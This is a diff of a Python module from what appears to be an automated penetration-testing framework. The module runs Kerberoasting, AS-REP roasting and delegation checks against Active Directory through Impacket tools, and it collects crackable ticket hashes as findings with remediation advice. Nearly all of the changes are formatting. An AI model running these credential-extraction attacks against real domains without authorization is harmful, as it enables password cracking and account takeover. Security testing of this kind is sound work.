@@ -21,7 +21,7 @@ import re
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
-from typing import List, Dict, Any, Optional
+from typing import Any, Dict, List, Optional
 
 from aipt_v2.core.event_loop_manager import current_time
 from aipt_v2.tools.active_directory.ad_config import ADConfig, get_ad_config
@@ -30,6 +30,7 @@ from aipt_v2.tools.active_directory.ad_config import ADConfig, get_ad_config
 @dataclass
 class KerberosFinding:
     """Kerberos attack finding."""
+
     attack_type: str  # kerberoast, asreproast, delegation, ticket
     severity: str
     title: str
@@ -48,6 +49,7 @@ class KerberosFinding:
 @dataclass
 class KerberosResult:
     """Result of Kerberos attacks."""
+
     domain: str
     status: str
     started_at: str
@@ -85,14 +87,11 @@ class KerberosAttacks:
 
         try:
             process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
 
             stdout, stderr = await asyncio.wait_for(
-                process.communicate(),
-                timeout=self.config.timeout
+                process.communicate(), timeout=self.config.timeout
             )
 
             return stdout.decode() + stderr.decode()
@@ -122,8 +121,9 @@ class KerberosAttacks:
         # Build GetUserSPNs command
         args = [
             f"{self.config.credentials.domain}/{self.config.credentials.username}",
-            "-dc-ip", self.config.dc_ip,
-            "-request"
+            "-dc-ip",
+            self.config.dc_ip,
+            "-request",
         ]
 
         if self.config.credentials.password:
@@ -148,16 +148,18 @@ class KerberosAttacks:
             user_match = re.search(r"\$krb5tgs\$\d+\$\*([^$]+)\$", match)
             username = user_match.group(1) if user_match else "unknown"
 
-            self.findings.append(KerberosFinding(
-                attack_type="kerberoast",
-                severity="high",
-                title=f"Kerberoastable Account: {username}",
-                description=f"Extracted TGS ticket for {username}",
-                account=username,
-                hash_value=match[:100] + "...",
-                crackable=True,
-                remediation="Use strong passwords (25+ chars) for service accounts"
-            ))
+            self.findings.append(
+                KerberosFinding(
+                    attack_type="kerberoast",
+                    severity="high",
+                    title=f"Kerberoastable Account: {username}",
+                    description=f"Extracted TGS ticket for {username}",
+                    account=username,
+                    hash_value=match[:100] + "...",
+                    crackable=True,
+                    remediation="Use strong passwords (25+ chars) for service accounts",
+                )
+            )
 
         self.kerberoast_hashes = hashes
         return hashes
@@ -177,11 +179,7 @@ class KerberosAttacks:
         hashes = []
 
         # Build GetNPUsers command
-        args = [
-            f"{self.config.credentials.domain}/",
-            "-dc-ip", self.config.dc_ip,
-            "-request"
-        ]
+        args = [f"{self.config.credentials.domain}/", "-dc-ip", self.config.dc_ip, "-request"]
 
         # Can run without credentials to find vulnerable users
         if self.config.credentials.username:
@@ -208,16 +206,18 @@ class KerberosAttacks:
             user_match = re.search(r"\$krb5asrep\$\d+\$([^@]+)@", match)
             username = user_match.group(1) if user_match else "unknown"
 
-            self.findings.append(KerberosFinding(
-                attack_type="asreproast",
-                severity="high",
-                title=f"AS-REP Roastable Account: {username}",
-                description=f"Account {username} does not require pre-auth",
-                account=username,
-                hash_value=match[:100] + "...",
-                crackable=True,
-                remediation="Enable Kerberos pre-authentication for this account"
-            ))
+            self.findings.append(
+                KerberosFinding(
+                    attack_type="asreproast",
+                    severity="high",
+                    title=f"AS-REP Roastable Account: {username}",
+                    description=f"Account {username} does not require pre-auth",
+                    account=username,
+                    hash_value=match[:100] + "...",
+                    crackable=True,
+                    remediation="Enable Kerberos pre-authentication for this account",
+                )
+            )
 
         self.asreproast_hashes = hashes
         return hashes
@@ -234,7 +234,8 @@ class KerberosAttacks:
         # Use findDelegation.py from Impacket
         args = [
             f"{self.config.credentials.domain}/{self.config.credentials.username}",
-            "-dc-ip", self.config.dc_ip
+            "-dc-ip",
+            self.config.dc_ip,
         ]
 
         if self.config.credentials.password:
@@ -246,34 +247,40 @@ class KerberosAttacks:
 
         # Parse delegation output
         if "Unconstrained" in output:
-            findings.append(KerberosFinding(
-                attack_type="delegation",
-                severity="critical",
-                title="Unconstrained Delegation Found",
-                description="Account with unconstrained delegation can impersonate any user",
-                account="See output for details",
-                remediation="Use constrained delegation or remove delegation rights"
-            ))
+            findings.append(
+                KerberosFinding(
+                    attack_type="delegation",
+                    severity="critical",
+                    title="Unconstrained Delegation Found",
+                    description="Account with unconstrained delegation can impersonate any user",
+                    account="See output for details",
+                    remediation="Use constrained delegation or remove delegation rights",
+                )
+            )
 
         if "Constrained" in output:
-            findings.append(KerberosFinding(
-                attack_type="delegation",
-                severity="high",
-                title="Constrained Delegation Found",
-                description="Account can delegate to specific services",
-                account="See output for details",
-                remediation="Review delegation targets and minimize scope"
-            ))
+            findings.append(
+                KerberosFinding(
+                    attack_type="delegation",
+                    severity="high",
+                    title="Constrained Delegation Found",
+                    description="Account can delegate to specific services",
+                    account="See output for details",
+                    remediation="Review delegation targets and minimize scope",
+                )
+            )
 
         if "Resource-Based Constrained" in output or "RBCD" in output:
-            findings.append(KerberosFinding(
-                attack_type="delegation",
-                severity="high",
-                title="Resource-Based Constrained Delegation",
-                description="RBCD configured - may be abusable",
-                account="See output for details",
-                remediation="Review msDS-AllowedToActOnBehalfOfOtherIdentity"
-            ))
+            findings.append(
+                KerberosFinding(
+                    attack_type="delegation",
+                    severity="high",
+                    title="Resource-Based Constrained Delegation",
+                    description="RBCD configured - may be abusable",
+                    account="See output for details",
+                    remediation="Review msDS-AllowedToActOnBehalfOfOtherIdentity",
+                )
+            )
 
         self.findings.extend(findings)
         return findings
@@ -289,7 +296,8 @@ class KerberosAttacks:
 
         args = [
             f"{self.config.credentials.domain}/{self.config.credentials.username}",
-            "-dc-ip", self.config.dc_ip
+            "-dc-ip",
+            self.config.dc_ip,
         ]
 
         if self.config.credentials.password:
@@ -303,10 +311,12 @@ class KerberosAttacks:
             if "/" in line and not line.startswith("#") and not line.startswith("["):
                 parts = line.split()
                 if len(parts) >= 2:
-                    spns.append({
-                        "spn": parts[0] if "/" in parts[0] else parts[1],
-                        "user": parts[0] if "/" not in parts[0] else "unknown"
-                    })
+                    spns.append(
+                        {
+                            "spn": parts[0] if "/" in parts[0] else parts[1],
+                            "user": parts[0] if "/" not in parts[0] else "unknown",
+                        }
+                    )
 
         return spns
 
@@ -364,18 +374,14 @@ class KerberosAttacks:
             metadata={
                 "kerberoast_count": len(self.kerberoast_hashes),
                 "asreproast_count": len(self.asreproast_hashes),
-                "finding_count": len(self.findings)
-            }
+                "finding_count": len(self.findings),
+            },
         )
 
 
 # Convenience functions
 async def run_kerberoast(
-    domain: str,
-    dc_ip: str,
-    username: str,
-    password: str,
-    **kwargs
+    domain: str, dc_ip: str, username: str, password: str, **kwargs
 ) -> List[str]:
     """
     Quick Kerberoasting attack.
@@ -389,23 +395,14 @@ async def run_kerberoast(
     Returns:
         List of TGS hashes
     """
-    config = get_ad_config(
-        domain=domain,
-        dc_ip=dc_ip,
-        username=username,
-        password=password
-    )
+    config = get_ad_config(domain=domain, dc_ip=dc_ip, username=username, password=password)
 
     attacker = KerberosAttacks(config)
     return await attacker.kerberoast()
 
 
 async def run_asreproast(
-    domain: str,
-    dc_ip: str,
-    username: str = None,
-    password: str = None,
-    userlist: List[str] = None
+    domain: str, dc_ip: str, username: str = None, password: str = None, userlist: List[str] = None
 ) -> List[str]:
     """
     Quick AS-REP Roasting attack.
@@ -421,10 +418,7 @@ async def run_asreproast(
         List of AS-REP hashes
     """
     config = get_ad_config(
-        domain=domain,
-        dc_ip=dc_ip,
-        username=username or "",
-        password=password or ""
+        domain=domain, dc_ip=dc_ip, username=username or "", password=password or ""
     )
 
     attacker = KerberosAttacks(config)
